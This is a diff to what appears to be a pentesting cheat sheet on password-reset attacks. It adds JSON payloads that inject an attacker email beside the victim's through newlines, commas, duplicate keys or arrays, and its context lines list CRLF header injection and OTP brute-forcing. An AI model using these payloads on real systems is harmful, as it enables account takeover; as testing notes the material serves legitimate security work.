@@ -659,6 +659,11 @@ reset password
 3. email= victim@gmail.com |email=attacker@gmil.com
 4. email= victim@gmail.com%0d%0acc:attacker@gmil.com
 5. email= victim@gmail.com&code= my password reset token
+{"email":"victim@gmail.com\nattacker@gmail.com"}
+{"email":"victim@gmail.com,attacker@gmail.com"}
+{"email":"victim@gmial.com","email":"attacker@gmail.com"}
+{"email":["victim@gmail.com","attacker@gmial.com"]}
+
 6-referrer : https://hossamshady.me
 7- {"email":["victim@gmail.com","hacker@gmail.com"]}
 8- try to brute force otp reset password with intruder 
